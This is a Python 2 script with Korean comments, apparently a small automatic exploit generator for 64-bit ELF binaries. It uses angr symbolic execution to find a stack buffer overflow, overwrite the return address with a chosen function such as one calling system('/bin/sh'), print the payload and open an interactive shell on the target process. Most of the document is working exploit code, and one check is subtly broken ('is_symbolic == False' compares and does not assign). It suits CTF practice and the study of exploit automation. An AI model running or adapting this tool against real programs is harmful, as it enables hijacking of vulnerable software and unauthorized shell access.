#  간단한 프로그램의 BOF 취약점을 탐지해주는 프로그램
#  64bit ELF 한정 가능.
#  pwntool, angr 가 설치되어있어야 함.
#
#  python aeg.py [filename] [oneshot_function]
#  꼴로 실행.
#  filename : 파일이름, oneshot_function : system('/bin/sh'); 가 있는 함수를 권장 (아무 함수나 가능하기는 함.) , 함수의 이름 적기
#
#  #include<stdio.h>
#
#  void shell(){
#  		system("/bin/sh");
#  }
#
#  int main(int argc, char *argv[]){
#
#  		char buf[40];
#  		scanf("%s", buf);
#  		return 0;
#  	}
#
#  	같은 예제에서의 실행 결과. https://i.imgur.com/mPywyux.png
#
#   실행 원리 : stack 에서 buf 부터 ret 까지를 symbolic 한지를 체킹함
#   		  	=> symbolic 할 경우 buffer overflow 가 있다는 말.
#   		 	   그러면 buf 부터 ret 까지의 거리를 잰 후, ret 영역에 oneshot_function 의 주소를 넣어줌으로써 bof 를 검증함.
#
#	github : https://github.com/Ppwner/Exploit/tree/master/Technique/aeg
import sys, os, logging
import angr
from angr import sim_options as so
from pwn import *

def check_symbolic(state, length):		# symbolic 한지 체킹해줌.
	stdin = state.posix.get_file(0)
	sym_addrs = list()

	for i in stdin.variables():
		sym_addrs.extend(state.memory.addrs_for_name(i))

	for addr in sym_addrs:
		is_sym_addr = True

		for i in range(length):
			if not addr + i in sym_addrs:
				is_sym_addr = False
				break

		if is_sym_addr:
			yield addr

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print "[Usage] : python aeg.py [filename] [oneshot_function]"
		sys.exit(1)
	filename = sys.argv[1]
	function = sys.argv[2]

	p = angr.Project(filename, auto_load_libs=False)

	opts = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
	es = p.factory.entry_state(add_options=opts)
	sm = p.factory.simgr(es, save_unconstrained=True)

	addr = p.loader.find_symbol(function).linked_addr
	print "[Addr] : 0x%x" % addr

	ex_state = None
	while ex_state is None:
		sm.step()
		if len(sm.unconstrained) == 0:
			continue
		for i in sm.unconstrained:
			is_symbolic = True

			for j in range(0, i.arch.bits):
				if not i.se.symbolic(i.regs.rip[j]):
					is_symbolic == False
					break

			if is_symbolic:
				ex_state = i

		sm.drop(stash='unconstrained')

	assert ex_state.se.symbolic(ex_state.regs.rip)		# symbolic 하지 않으면 종료시킴.

	for sym_addr in check_symbolic(ex_state,8):
		ex_state.add_constraints(ex_state.regs.rip == addr)

		if ex_state.satisfiable():
			break
		else:
			sys.exit(1)

	pay = ex_state.posix.dumps(0)
	print "---------Payload---------"
	print hexdump(pay)
	p = process(filename)
	p.sendline(pay)
	p.interactive()

